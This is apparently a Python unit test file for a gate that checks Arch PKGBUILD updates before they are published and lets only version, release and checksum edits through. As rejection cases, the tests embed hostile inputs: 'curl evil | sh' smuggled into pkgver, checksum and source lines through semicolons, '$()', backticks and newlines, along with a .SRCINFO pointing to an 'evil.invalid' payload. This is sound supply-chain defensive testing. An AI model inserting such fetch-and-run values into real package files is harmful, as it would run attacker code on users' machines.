#!/usr/bin/env python3
"""Tests for the sealed PKGBUILD gate."""

from __future__ import annotations

import hashlib
import tempfile
import unittest
from pathlib import Path

import publish_artifact as gate

H1 = "ab" * 32
H2 = "cd" * 32
H3 = "ef" * 32

BASELINE = f"""pkgname=maple-mono-nf-cn
pkgver=7.9
pkgrel=1
source=("https://example.invalid/MapleMono.zip")
sha256sums=('{H1}'
            '{H2}')
"""


def write_pkgbuild(directory: Path, pkgbuild: str) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "PKGBUILD").write_text(pkgbuild, encoding="utf-8")


class StageTest(unittest.TestCase):
    def stage(self, root: Path, pkgbuild: str, baseline: str = BASELINE, package: str = "maple-mono-nf-cn") -> Path:
        base = root / "baseline"
        base.write_text(baseline, encoding="utf-8")
        out = root / "out"
        write_pkgbuild(out, pkgbuild)
        stage = root / "stage"
        gate.stage(package, base, out, stage)
        return stage

    def test_checksum_edit_is_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            updated = BASELINE.replace(H1, H3)
            stage = self.stage(Path(tmp), updated)
            manifest = (stage / "MANIFEST").read_text(encoding="utf-8")
            self.assertIn("status=publish", manifest)
            self.assertNotIn("srcinfo=", manifest)
            digest = hashlib.sha256(updated.encode()).hexdigest()
            self.assertIn(f"pkgbuild={digest}", manifest)
            self.assertEqual(sorted(path.name for path in stage.iterdir()), ["MANIFEST", "PKGBUILD"])

    def test_pkgver_and_pkgrel_edits_are_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            updated = BASELINE.replace("pkgver=7.9", "pkgver=7.10").replace("pkgrel=1", "pkgrel=2")
            self.stage(Path(tmp), updated)

    def test_source_url_edit_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            updated = BASELINE.replace("example.invalid", "evil.invalid")
            with self.assertRaises(SystemExit) as caught:
                self.stage(Path(tmp), updated)
            self.assertIn("beyond pkgver", str(caught.exception))

    def test_unsafe_pkgver_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            updated = BASELINE.replace("pkgver=7.9", "pkgver=7.9; curl evil | sh")
            with self.assertRaises(SystemExit) as caught:
                self.stage(Path(tmp), updated)
            self.assertIn("unsafe pkgver", str(caught.exception))

    def test_smuggled_checksum_lines_are_rejected(self) -> None:
        variants = {
            "semicolon": f"sha256sums=('{H1}'); curl evil | sh",
            "and": f"sha256sums=('{H1}') && curl evil | sh",
            "command": "sha256sums=('$(curl evil)')",
            "backtick": "sha256sums=('`curl evil`')",
            "comment": f"sha256sums=('{H1}') # keep",
            "uppercase": "sha256sums=('AB" + ("ab" * 31) + "')",
            "short": "sha256sums=('abcd')",
            "injected": f"sha256sums=('{H1}'\ncurl evil | sh\n'{H2}')",
            "skip": "sha256sums=('SKIP')",
        }
        for name, sums in variants.items():
            with self.subTest(name=name):
                updated = "pkgname=maple-mono-nf-cn\npkgver=7.9\npkgrel=1\n" + sums + "\n"
                baseline = (
                    "pkgname=maple-mono-nf-cn\npkgver=7.9\npkgrel=1\n"
                    f"sha256sums=('{H1}')\n"
                )
                with tempfile.TemporaryDirectory() as tmp:
                    with self.assertRaises(SystemExit):
                        self.stage(Path(tmp), updated, baseline)

    def test_arch_specific_sums_and_multiline_are_accepted(self) -> None:
        baseline = (
            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
            f"sha256sums_x86_64=('{H1}')\n"
            f"sha256sums_aarch64=('{H2}')\n"
        )
        updated = baseline.replace(H1, H3)
        with tempfile.TemporaryDirectory() as tmp:
            self.stage(Path(tmp), updated, baseline, "memprocfs")

    def test_git_skip_and_abbrev_growth(self) -> None:
        baseline = (
            "pkgname=cuda-api-wrappers-git\n"
            "pkgver=0.8.2.r0.gc2f2a2b\n"
            "pkgrel=1\n"
            "sha256sums=('SKIP')\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.stage(
                root,
                baseline.replace("gc2f2a2b", "gc2f2a2b1"),
                baseline,
                "cuda-api-wrappers-git",
            )
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(SystemExit) as caught:
                self.stage(
                    Path(tmp),
                    baseline.replace("gc2f2a2b", "deadbeef"),
                    baseline,
                    "cuda-api-wrappers-git",
                )
            self.assertIn("not the same commit", str(caught.exception))

    def test_extra_file_and_symlink_are_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            base = root / "baseline"
            base.write_text(BASELINE, encoding="utf-8")
            out = root / "out"
            write_pkgbuild(out, BASELINE)
            (out / "publish.sh").write_text("echo pwned\n", encoding="utf-8")
            with self.assertRaises(SystemExit):
                gate.stage("maple-mono-nf-cn", base, out, root / "stage")
            linked = root / "linked"
            linked.mkdir()
            (linked / "PKGBUILD").symlink_to(base)
            with self.assertRaises(SystemExit):
                gate.stage("maple-mono-nf-cn", base, linked, root / "stage2")


class ImportTest(unittest.TestCase):
    def test_import_replaces_pkgbuild_only(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            updated = BASELINE.replace(H1, H3)
            stage = StageTest().stage(root, updated)
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            (dest / ".SRCINFO").write_text("old\n", encoding="utf-8")
            (dest / "extra.txt").write_text("keep\n", encoding="utf-8")
            gate.import_artifact("maple-mono-nf-cn", stage, dest)
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), updated)
            self.assertEqual((dest / ".SRCINFO").read_text(encoding="utf-8"), "old\n")
            self.assertEqual((dest / "extra.txt").read_text(encoding="utf-8"), "keep\n")

    def test_import_refuses_a_downgrade(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = StageTest().stage(root, BASELINE)
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            current = BASELINE.replace("pkgver=7.9", "pkgver=8.0")
            (dest / "PKGBUILD").write_text(current, encoding="utf-8")
            with self.assertRaises(SystemExit) as caught:
                gate.import_artifact("maple-mono-nf-cn", stage, dest)
            self.assertIn("older", str(caught.exception))
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), current)

    def test_import_allows_a_strict_source_url_change(self) -> None:
        old = (
            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
            'source_x86_64=("https://example.invalid/old.tar.gz")\n'
            f"sha256sums_x86_64=('{H1}')\n"
        )
        new = old.replace("old.tar.gz", "new.tar.gz").replace(H1, H3).replace("pkgrel=20261014", "pkgrel=20261101")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, new)
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "memprocfs"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(old, encoding="utf-8")
            gate.import_artifact("memprocfs", artifact, dest)
            self.assertIn("new.tar.gz", (dest / "PKGBUILD").read_text(encoding="utf-8"))

    def test_import_rejects_shell_in_source_and_srcinfo_payload(self) -> None:
        old = (
            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
            'source_x86_64=("https://example.invalid/old.tar.gz")\n'
            f"sha256sums_x86_64=('{H1}')\n"
        )
        new = old.replace(
            'source_x86_64=("https://example.invalid/old.tar.gz")',
            'source_x86_64=("https://example.invalid/old.tar.gz"); curl evil | sh',
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, new)
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "memprocfs"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(old, encoding="utf-8")
            with self.assertRaises(SystemExit):
                gate.import_artifact("memprocfs", artifact, dest)

        smuggled_srcinfo = (
            "pkgbase = maple-mono-nf-cn\n"
            "\tsource = https://evil.invalid/payload\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, BASELINE)
            (artifact / ".SRCINFO").write_text(smuggled_srcinfo, encoding="utf-8")
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            with self.assertRaises(SystemExit) as caught:
                gate.import_artifact("maple-mono-nf-cn", artifact, dest)
            self.assertIn("unexpected artifact files", str(caught.exception))

    def test_import_allows_the_same_git_commit_with_a_shorter_hash(self) -> None:
        current = (
            "pkgname=cuda-api-wrappers-git\n"
            "pkgver=0.8.2.r0.gc2f2a2b1\n"
            "pkgrel=1\n"
            "sha256sums=('SKIP')\n"
        )
        updated = current.replace("gc2f2a2b1", "gc2f2a2b")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            artifact = root / "artifact"
            write_pkgbuild(artifact, updated)
            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
            dest = root / "cuda-api-wrappers-git"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(current, encoding="utf-8")
            gate.import_artifact("cuda-api-wrappers-git", artifact, dest)
            self.assertIn("pkgver=0.8.2.r0.gc2f2a2b\n", (dest / "PKGBUILD").read_text(encoding="utf-8"))

    REFLECTCPP_R10 = (
        "pkgname=reflectcpp-git\n"
        "pkgver=0.26.2.r10.g587b72ee\n"
        "pkgrel=1\n"
        "sha256sums=('SKIP')\n"
    )
    REFLECTCPP_R12 = REFLECTCPP_R10.replace("r10.g587b72ee", "r12.g5457ea3c")

    def import_git(self, current: str, updated: str) -> Path:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        artifact = root / "artifact"
        write_pkgbuild(artifact, updated)
        gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
        dest = root / "reflectcpp-git"
        dest.mkdir()
        (dest / "PKGBUILD").write_text(current, encoding="utf-8")
        gate.import_artifact("reflectcpp-git", artifact, dest)
        return dest

    def test_import_allows_a_newer_git_commit(self) -> None:
        dest = self.import_git(self.REFLECTCPP_R10, self.REFLECTCPP_R12)
        self.assertIn("pkgver=0.26.2.r12.g5457ea3c\n", (dest / "PKGBUILD").read_text(encoding="utf-8"))

    def test_import_refuses_an_older_git_commit(self) -> None:
        with self.assertRaises(SystemExit) as caught:
            self.import_git(self.REFLECTCPP_R12, self.REFLECTCPP_R10)
        self.assertIn("older", str(caught.exception))

    def test_import_still_rejects_other_edits_on_a_git_bump(self) -> None:
        updated = self.REFLECTCPP_R12 + "install=evil.install\n"
        with self.assertRaises(SystemExit) as caught:
            self.import_git(self.REFLECTCPP_R10, updated)
        self.assertIn("changed beyond", str(caught.exception))

    def test_stage_still_requires_the_same_git_commit(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(SystemExit) as caught:
                StageTest().stage(Path(tmp), self.REFLECTCPP_R12, self.REFLECTCPP_R10, "reflectcpp-git")
            self.assertIn("not the same commit", str(caught.exception))

    def test_skip_marker_does_not_touch_the_checkout(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = root / "stage"
            gate.stage_skip(stage)
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            gate.import_artifact("maple-mono-nf-cn", stage, dest)
            self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), BASELINE)

    def test_nested_download_directory_is_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = StageTest().stage(root, BASELINE)
            nested = root / "download"
            nested.mkdir()
            stage.rename(nested / "aur-stage")
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            gate.import_artifact("maple-mono-nf-cn", nested, dest)
            self.assertFalse((dest / ".SRCINFO").exists())

    def test_manifest_hash_mismatch_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            stage = StageTest().stage(root, BASELINE)
            manifest = stage / "MANIFEST"
            text = manifest.read_text(encoding="utf-8")
            text = text.replace(text.split("pkgbuild=", 1)[1][:8], "00000000")
            manifest.write_text(text, encoding="utf-8")
            dest = root / "maple-mono-nf-cn"
            dest.mkdir()
            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
            with self.assertRaises(SystemExit) as caught:
                gate.import_artifact("maple-mono-nf-cn", stage, dest)
            self.assertIn("hash", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
